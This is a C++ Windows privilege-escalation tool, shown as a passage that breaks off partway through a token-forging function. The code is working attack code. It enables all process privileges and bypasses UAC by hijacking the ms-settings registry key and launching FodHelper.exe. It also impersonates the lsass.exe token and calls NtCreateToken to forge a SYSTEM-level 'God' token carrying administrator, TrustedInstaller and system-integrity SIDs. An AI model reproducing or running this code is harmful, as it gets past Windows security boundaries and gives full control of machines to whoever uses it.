#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <sddl.h>
#include <sstream>
#include <lm.h>
#pragma comment(lib, "Netapi32.lib")
#include <userenv.h>
#pragma comment(lib, "Userenv.lib")

void PrintError(DWORD errorCode) {
	LPSTR systemMessage = NULL;
	DWORD systemMessageLength = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, NULL, errorCode, 0, reinterpret_cast<LPSTR>(&systemMessage), 0, NULL);
	std::cerr << "ERROR: " << systemMessage;
	std::cout.flush();
	std::wcout.flush();
	std::cerr.flush();
	std::wcerr.flush();
	LocalFree(systemMessage);
}

BOOL EnableAllPrivileges() {
	HANDLE currentToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentToken)) {
		PrintError(GetLastError());
		std::wcerr << L"ERROR: Failed to open current process token." << std::endl;
		return FALSE;
	}
	DWORD currentTokenPrivilegesLength = 0;
	GetTokenInformation(currentToken, TokenPrivileges, NULL, 0, &currentTokenPrivilegesLength);
	if (currentTokenPrivilegesLength == 0) {
		PrintError(GetLastError());
		std::wcerr << L"ERROR: Failed to get length of current token privileges." << std::endl;
		return FALSE;
	}
	TOKEN_PRIVILEGES* currentTokenPrivileges = reinterpret_cast<TOKEN_PRIVILEGES*>(new BYTE[currentTokenPrivilegesLength]);
	DWORD currentTokenPrivilegesLength2 = 0;
	if (!GetTokenInformation(currentToken, TokenPrivileges, currentTokenPrivileges, currentTokenPrivilegesLength, &currentTokenPrivilegesLength2) || currentTokenPrivilegesLength != currentTokenPrivilegesLength2) {
		PrintError(GetLastError());
		std::wcerr << L"ERROR: Failed to get current token privileges." << std::endl;
		delete[] currentTokenPrivileges;
		return FALSE;
	}
	for (DWORD i = 0; i < currentTokenPrivileges->PrivilegeCount; i++) {
		currentTokenPrivileges->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
	}
	if (!AdjustTokenPrivileges(currentToken, FALSE, currentTokenPrivileges, currentTokenPrivilegesLength, NULL, NULL) || GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		PrintError(GetLastError());
		std::wcerr << L"ERROR: Failed to adjust current token privileges." << std::endl;
		delete[] currentTokenPrivileges;
		return FALSE;
	}
	delete[] currentTokenPrivileges;
	if (!CloseHandle(currentToken)) {
		PrintError(GetLastError());
		std::wcerr << L"ERROR: Failed to close current process token." << std::endl;
		return FALSE;
	}
	return TRUE;
}

BOOL IsElevated() {
	HANDLE currentToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentToken)) {
		PrintError(GetLastError());
		std::wcerr << L"ERROR: Failed to open current process token." << std::endl;
		return FALSE;
	}
	DWORD currentTokenElevationLength = 0;
	TOKEN_ELEVATION currentTokenElevation = { };
	if (!GetTokenInformation(currentToken, TokenElevation, &currentTokenElevation, sizeof(TOKEN_ELEVATION), &currentTokenElevationLength) || currentTokenElevationLength != sizeof(TOKEN_ELEVATION)) {
		PrintError(GetLastError());
		std::wcerr << L"ERROR: Failed to get token elevation status for current process token." << std::endl;
		CloseHandle(currentToken);
		return FALSE;
	}
	BOOL isElevated = currentTokenElevation.TokenIsElevated != 0;
	if (!CloseHandle(currentToken)) {
		PrintError(GetLastError());
		std::wcerr << L"ERROR: Failed to close current process token." << std::endl;
		return FALSE;
	}
	return isElevated;
}

BOOL ElevateViaUAC(int argc, char** argv) {
	// Get command line and current exe path
	std::wostringstream exePathStream = { };
	exePathStream << L"\"" << argv[0] << L"\"";
	std::wstring exePathString = exePathStream.str();
	LPWSTR exePath = new WCHAR[exePathString.size() + 1];
	memcpy(exePath, exePathString.c_str(), exePathString.size() * sizeof(WCHAR));
	exePath[exePathString.size()] = '\0';
	std::wostringstream commandLineStream = { };
	for (int i = 1; i < argc; i++) {
		if (i >= 2) {
			commandLineStream << L" ";
		}
		commandLineStream << L"\"" << argv[i] << L"\"";
	}
	std::wstring commandLineString = commandLineStream.str();
	LPWSTR commandLine = new WCHAR[commandLineString.size() + 1];
	memcpy(commandLine, commandLineString.c_str(), commandLineString.size() * sizeof(WCHAR));
	commandLine[commandLineString.size()] = '\0';

	// Restart the current process as admin with a UAC
	SHELLEXECUTEINFOW shellExecuteInfo = { };
	shellExecuteInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	shellExecuteInfo.fMask = SEE_MASK_NOASYNC | SEE_MASK_NOCLOSEPROCESS;
	shellExecuteInfo.hwnd = NULL;
	shellExecuteInfo.lpVerb = L"runas";
	shellExecuteInfo.lpFile = exePath;
	shellExecuteInfo.lpParameters = commandLine;
	shellExecuteInfo.lpDirectory = NULL;
	shellExecuteInfo.nShow = SW_SHOWNORMAL;
	shellExecuteInfo.hInstApp = NULL;
	shellExecuteInfo.lpIDList = NULL;
	shellExecuteInfo.lpClass = NULL;
	shellExecuteInfo.hkeyClass = NULL;
	shellExecuteInfo.dwHotKey = 0;
	shellExecuteInfo.hMonitor = NULL;
	shellExecuteInfo.hProcess = NULL;
	if (!ShellExecuteExW(&shellExecuteInfo)) {
		PrintError(GetLastError());
		std::wcerr << L"ERROR: Failed to shell execute current process with a UAC." << std::endl;
		delete[] exePath;
		delete[] commandLine;
		return FALSE;
	}
	delete[] exePath;
	delete[] commandLine;

	return TRUE;
}

LPWSTR GetCurrentExePathW() {
	UINT32 maxPathLength = MAX_PATH;
	UINT32 pathLength = 0;
	LPWSTR path = new WCHAR[maxPathLength];
	while (true) {
		pathLength = GetModuleFileNameW(NULL, path, maxPathLength);
		if (pathLength == 0) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to get current exe path." << std::endl;
			return NULL;
		}
		else if (pathLength == maxPathLength) {
			delete[] path;
			maxPathLength += MAX_PATH;
			path = new WCHAR[maxPathLength];
		}
		else {
			LPWSTR pathTrimmed = new WCHAR[pathLength + 1];
			lstrcpyW(pathTrimmed, path);
			delete[] path;
			return pathTrimmed;
		}
	}
}

BOOL ShellExecuteProcess(LPCWSTR exePath, LPCWSTR arguments) {
	if (((INT_PTR)ShellExecuteW(NULL, NULL, exePath, arguments, NULL, SW_NORMAL)) <= (INT_PTR)32) {
		PrintError(GetLastError());
		std::wcerr << L"ERROR: The call to ShellExecuteW failed." << std::endl;
		return FALSE;
	}
	return TRUE;
}

BOOL ElevateViaFodhelper(int argc, char** argv) {
	LPCWSTR regPath = L"SOFTWARE\\Classes\\ms-settings\\shell\\open\\command";
	LPCWSTR fodHelperPath = L"C:\\Windows\\System32\\FodHelper.exe";
	LPCWSTR fodHelperArgs = L"";
	LPCWSTR exePath = GetCurrentExePathW();
	if (exePath == NULL) {
		return FALSE;
	}
	DWORD exePathLength = lstrlenW(exePath) * sizeof(WCHAR);
	const BYTE* exePathBytes = reinterpret_cast<const BYTE*>(exePath);

	HKEY hKey = NULL;
	if (RegCreateKeyExW(HKEY_CURRENT_USER, regPath, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
		PrintError(GetLastError());
		std::wcerr << L"ERROR: The call to RegCreateKeyExW failed." << std::endl;
		return FALSE;
	}

	if (RegSetValueExW(hKey, NULL, 0, REG_SZ, exePathBytes, exePathLength) != ERROR_SUCCESS) {
		PrintError(GetLastError());
		std::wcerr << L"ERROR: The call to RegSetValueExW failed." << std::endl;
		RegCloseKey(hKey);
		return FALSE;
	}
	if (RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, NULL, 0) != ERROR_SUCCESS) {
		PrintError(GetLastError());
		std::wcerr << L"ERROR: The call to RegSetValueExW failed." << std::endl;
		RegCloseKey(hKey);
		return FALSE;
	}
	if (RegCloseKey(hKey) != ERROR_SUCCESS) {
		std::wcerr << L"ERROR: The call to RegCloseKey failed." << std::endl;
		return FALSE;
	}

	if (!ShellExecuteProcess(fodHelperPath, fodHelperArgs)) {
		return FALSE;
	}

	return TRUE;
}

BOOL IsGod() {
	HANDLE currentToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentToken)) {
		PrintError(GetLastError());
		std::wcerr << L"ERROR: Failed to open current process token." << std::endl;
		return FALSE;
	}
	DWORD currentTokenSourceLength = 0;
	TOKEN_SOURCE currentTokenSource = { };
	if (!GetTokenInformation(currentToken, TokenSource, &currentTokenSource, sizeof(TOKEN_SOURCE), &currentTokenSourceLength) || currentTokenSourceLength != sizeof(TOKEN_SOURCE)) {
		PrintError(GetLastError());
		std::wcerr << L"ERROR: Failed to get token source for current process token." << std::endl;
		CloseHandle(currentToken);
		return FALSE;
	}
	BOOL isGod = lstrcmpA(currentTokenSource.SourceName, "MYSTERY") == 0;
	if (!CloseHandle(currentToken)) {
		PrintError(GetLastError());
		std::wcerr << L"ERROR: Failed to close current process token." << std::endl;
		return FALSE;
	}
	return isGod;
}

HANDLE CreateGodToken() {
	/* KNOWN ISSUE
	NtCreateToken only works with pointers to stack memory or pointers to
	heap memory allocated with LocalAlloc or GlobalAlloc. C++ style new[]
	or C style malloc will not work.
	*/
	/* KNOWN ISSUE
	The SE_UNSOLICITED_INPUT_NAME privilege is not supported on Windows 10
	home edition and therefore is not given to the God token.
	*/

	typedef struct _UNICODE_STRING {
		USHORT Length;
		USHORT MaximumLength;
		PWSTR Buffer;
	} UNICODE_STRING, * PUNICODE_STRING;
	typedef struct OBJECT_ATTRIBUTES {
		ULONG Length;
		HANDLE RootDirectory;
		PUNICODE_STRING ObjectName;
		ULONG Attributes;
		PVOID SecurityDescriptor;
		PVOID SecurityQualityOfService;
	} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
	typedef NTSTATUS(*PNtCreateToken)(PHANDLE TokenHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, TOKEN_TYPE TokenType, PLUID AuthenticationId, PLARGE_INTEGER ExpirationTime, PTOKEN_USER TokenUser, PTOKEN_GROUPS TokenGroups, PTOKEN_PRIVILEGES TokenPrivileges, PTOKEN_OWNER TokenOwner, PTOKEN_PRIMARY_GROUP TokenPrimaryGroup, PTOKEN_DEFAULT_DACL TokenDefaultDacl, PTOKEN_SOURCE TokenSource);

	// Locate the PID of lsass.exe
	DWORD lsassPID = 0;
	{
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (snapshot == INVALID_HANDLE_VALUE) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to create snapshot." << std::endl;
			return INVALID_HANDLE_VALUE;
		}
		PROCESSENTRY32W processEntry = { };
		processEntry.dwSize = sizeof(PROCESSENTRY32W);
		if (!Process32FirstW(snapshot, &processEntry)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to get first process from snapshot." << std::endl;
			CloseHandle(snapshot);
			return INVALID_HANDLE_VALUE;
		}
		do {
			if (lstrcmpW(processEntry.szExeFile, L"lsass.exe") == 0) {
				lsassPID = processEntry.th32ProcessID;
				break;
			}
		} while (Process32NextW(snapshot, &processEntry));
		DWORD lastError = GetLastError();
		if (lastError != 0 && lastError != ERROR_NO_MORE_FILES) {
			PrintError(lastError);
			CloseHandle(snapshot);
			std::wcerr << L"ERROR: Failed to get next process from snapshot." << std::endl;
			return INVALID_HANDLE_VALUE;
		}
		if (!CloseHandle(snapshot)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to close handle to snapshot." << std::endl;
			return INVALID_HANDLE_VALUE;
		}
		if (lsassPID == 0) {
			std::wcerr << L"ERROR: Failed to locate process id of lsass.exe." << std::endl;
			return INVALID_HANDLE_VALUE;
		}
	}

	// Impersonate lsass.exe
	{
		HANDLE lsass = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, lsassPID);
		if (lsass == NULL) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to open handle to lsass.exe." << std::endl;
			return INVALID_HANDLE_VALUE;
		}
		HANDLE lsassToken = NULL;
		if (!OpenProcessToken(lsass, TOKEN_QUERY | TOKEN_DUPLICATE, &lsassToken)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to open handle to token of lsass.exe." << std::endl;
			CloseHandle(lsass);
			return INVALID_HANDLE_VALUE;
		}
		if (!ImpersonateLoggedOnUser(lsassToken)) {
			if (!SetThreadToken(NULL, lsassToken)) {
				PrintError(GetLastError());
				std::wcerr << L"ERROR: Failed to impersonate token of lsass.exe." << std::endl;
				CloseHandle(lsassToken);
				CloseHandle(lsass);
				return INVALID_HANDLE_VALUE;
			}
		}
		if (!CloseHandle(lsassToken)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to close handle to token of lsass.exe." << std::endl;
			CloseHandle(lsass);
			return INVALID_HANDLE_VALUE;
		}
		if (!CloseHandle(lsass)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to close handle to lsass.exe." << std::endl;
			return INVALID_HANDLE_VALUE;
		}
	}

	HANDLE godToken = NULL;
	{
		// Load NtCreateToken function from ntdll.dll
		HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
		if (ntdll == NULL) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to load library ntdll.dll." << std::endl;
			return INVALID_HANDLE_VALUE;
		}
		PNtCreateToken NtCreateToken = reinterpret_cast<PNtCreateToken>(GetProcAddress(ntdll, "NtCreateToken"));
		if (NtCreateToken == NULL) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to locate NtCreateToken from ntdll.dll." << std::endl;
			return INVALID_HANDLE_VALUE;
		}

		// Prepare access mask for function call to NtCreateToken
		ACCESS_MASK desiredAccess = TOKEN_ALL_ACCESS;

		// Prepare security quality of server for function call to NtCreateToken
		SECURITY_QUALITY_OF_SERVICE securityQualityOfService = { };
		securityQualityOfService.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
		securityQualityOfService.ImpersonationLevel = SecurityAnonymous;
		securityQualityOfService.ContextTrackingMode = SECURITY_STATIC_TRACKING;
		securityQualityOfService.EffectiveOnly = FALSE;

		// Prepare object attributes for function call to NtCreateToken
		OBJECT_ATTRIBUTES objectAttributes = { };
		objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
		objectAttributes.RootDirectory = NULL;
		objectAttributes.ObjectName = NULL;
		objectAttributes.Attributes = 0;
		objectAttributes.SecurityDescriptor = NULL;
		objectAttributes.SecurityQualityOfService = &securityQualityOfService;

		// Prepare token type for function call to NtCreateToken
		TOKEN_TYPE tokenType = TokenPrimary;

		// Prepare authentication id for function call to NtCreateToken
		LUID authenticationID = SYSTEM_LUID;

		// Prepare expiration time for function call to NtCreateToken
		LARGE_INTEGER expirationTime = { };
		expirationTime.QuadPart = 9223372036854775807;

		// Prepare token default dacl for function call to NtCreateToken
		TOKEN_DEFAULT_DACL tokenDefaultDacl = { };
		tokenDefaultDacl.DefaultDacl = NULL;

		// Prepare token source for function call to NtCreateToken
		TOKEN_SOURCE tokenSource = { };
		tokenSource.SourceIdentifier = SYSTEM_LUID;
		memcpy(tokenSource.SourceName, "MYSTERY", 8);

		// Prepare token privileges for function call to NtCreateToken
		constexpr DWORD tokenPrivilegesPrivilegeCount = 35;
		PTOKEN_PRIVILEGES tokenPrivileges = reinterpret_cast<PTOKEN_PRIVILEGES>(LocalAlloc(LPTR, sizeof(PTOKEN_PRIVILEGES) + ((tokenPrivilegesPrivilegeCount - 1) * sizeof(LUID_AND_ATTRIBUTES))));
		tokenPrivileges->PrivilegeCount = 35;
		for (int i = 0; i < tokenPrivilegesPrivilegeCount; i++)
		{
			tokenPrivileges->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED | SE_PRIVILEGE_ENABLED_BY_DEFAULT;
		}
		if (!LookupPrivilegeValueW(NULL, SE_CREATE_TOKEN_NAME, &tokenPrivileges->Privileges[0].Luid))
		{
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_CREATE_TOKEN_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &tokenPrivileges->Privileges[1].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_ASSIGNPRIMARYTOKEN_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_LOCK_MEMORY_NAME, &tokenPrivileges->Privileges[2].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_LOCK_MEMORY_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_INCREASE_QUOTA_NAME, &tokenPrivileges->Privileges[3].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_INCREASE_QUOTA_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_MACHINE_ACCOUNT_NAME, &tokenPrivileges->Privileges[4].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_MACHINE_ACCOUNT_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_TCB_NAME, &tokenPrivileges->Privileges[5].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_TCB_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_SECURITY_NAME, &tokenPrivileges->Privileges[6].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_SECURITY_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_TAKE_OWNERSHIP_NAME, &tokenPrivileges->Privileges[7].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_TAKE_OWNERSHIP_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_LOAD_DRIVER_NAME, &tokenPrivileges->Privileges[8].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_LOAD_DRIVER_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_SYSTEM_PROFILE_NAME, &tokenPrivileges->Privileges[9].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_SYSTEM_PROFILE_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_SYSTEMTIME_NAME, &tokenPrivileges->Privileges[10].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_SYSTEMTIME_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_PROF_SINGLE_PROCESS_NAME, &tokenPrivileges->Privileges[11].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_PROF_SINGLE_PROCESS_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_INC_BASE_PRIORITY_NAME, &tokenPrivileges->Privileges[12].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_INC_BASE_PRIORITY_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_CREATE_PAGEFILE_NAME, &tokenPrivileges->Privileges[13].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_CREATE_PAGEFILE_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_CREATE_PERMANENT_NAME, &tokenPrivileges->Privileges[14].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_CREATE_PERMANENT_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_BACKUP_NAME, &tokenPrivileges->Privileges[15].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_BACKUP_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_RESTORE_NAME, &tokenPrivileges->Privileges[16].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_RESTORE_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_SHUTDOWN_NAME, &tokenPrivileges->Privileges[17].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_SHUTDOWN_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &tokenPrivileges->Privileges[18].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_DEBUG_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_AUDIT_NAME, &tokenPrivileges->Privileges[19].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_AUDIT_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_SYSTEM_ENVIRONMENT_NAME, &tokenPrivileges->Privileges[20].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_SYSTEM_ENVIRONMENT_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_CHANGE_NOTIFY_NAME, &tokenPrivileges->Privileges[21].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_CHANGE_NOTIFY_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_REMOTE_SHUTDOWN_NAME, &tokenPrivileges->Privileges[22].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_REMOTE_SHUTDOWN_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_UNDOCK_NAME, &tokenPrivileges->Privileges[23].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_UNDOCK_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_SYNC_AGENT_NAME, &tokenPrivileges->Privileges[24].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_SYNC_AGENT_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_ENABLE_DELEGATION_NAME, &tokenPrivileges->Privileges[25].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_ENABLE_DELEGATION_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_MANAGE_VOLUME_NAME, &tokenPrivileges->Privileges[26].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_MANAGE_VOLUME_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_IMPERSONATE_NAME, &tokenPrivileges->Privileges[27].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_IMPERSONATE_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_CREATE_GLOBAL_NAME, &tokenPrivileges->Privileges[28].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_CREATE_GLOBAL_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_TRUSTED_CREDMAN_ACCESS_NAME, &tokenPrivileges->Privileges[29].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_TRUSTED_CREDMAN_ACCESS_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_RELABEL_NAME, &tokenPrivileges->Privileges[30].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_RELABEL_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_INC_WORKING_SET_NAME, &tokenPrivileges->Privileges[31].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_INC_WORKING_SET_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_TIME_ZONE_NAME, &tokenPrivileges->Privileges[32].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_TIME_ZONE_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_CREATE_SYMBOLIC_LINK_NAME, &tokenPrivileges->Privileges[33].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_CREATE_SYMBOLIC_LINK_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		if (!LookupPrivilegeValueW(NULL, SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME, &tokenPrivileges->Privileges[34].Luid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to lookup privilege SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}

		// Get sids for users, groups, and integrity levels needed later
		PSID systemUserSid = NULL;
		if (!ConvertStringSidToSidW(L"S-1-5-18", &systemUserSid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to convert string to SID S-1-5-18." << std::endl;
			LocalFree(tokenPrivileges);
			return INVALID_HANDLE_VALUE;
		}
		PSID administratorsGroupSid = NULL;
		if (!ConvertStringSidToSidW(L"S-1-5-32-544", &administratorsGroupSid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to convert string to SID S-1-5-32-544." << std::endl;
			LocalFree(tokenPrivileges);
			LocalFree(systemUserSid);
			return INVALID_HANDLE_VALUE;
		}
		PSID authenticatedUsersGroupSid = NULL;
		if (!ConvertStringSidToSidW(L"S-1-5-11", &authenticatedUsersGroupSid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to convert string to SID S-1-5-11." << std::endl;
			LocalFree(tokenPrivileges);
			LocalFree(systemUserSid);
			LocalFree(administratorsGroupSid);
			return INVALID_HANDLE_VALUE;
		}
		PSID everyoneGroupSid = NULL;
		if (!ConvertStringSidToSidW(L"S-1-1-0", &everyoneGroupSid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to convert string to SID S-1-1-0." << std::endl;
			LocalFree(tokenPrivileges);
			LocalFree(systemUserSid);
			LocalFree(administratorsGroupSid);
			LocalFree(authenticatedUsersGroupSid);
			return INVALID_HANDLE_VALUE;
		}
		PSID systemIntegrityLevelSid = NULL;
		if (!ConvertStringSidToSidW(L"S-1-16-16384", &systemIntegrityLevelSid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to convert string to SID S-1-16-16384." << std::endl;
			LocalFree(tokenPrivileges);
			LocalFree(systemUserSid);
			LocalFree(administratorsGroupSid);
			LocalFree(authenticatedUsersGroupSid);
			LocalFree(everyoneGroupSid);
			return INVALID_HANDLE_VALUE;
		}
		PSID trustedInstallerUserSid = NULL;
		if (!ConvertStringSidToSidW(L"S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464", &trustedInstallerUserSid)) {
			PrintError(GetLastError());
			std::wcerr << L"ERROR: Failed to convert string to SID S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464." << std::endl;
			LocalFree(tokenPrivileges);
			LocalFree(systemUserSid);
			LocalFree(administratorsGroupSid);
			LocalFree(authenticatedUsersGroupSid);
			LocalFree(everyoneGroupSid);
			LocalFree(systemIntegrityLevelSid);
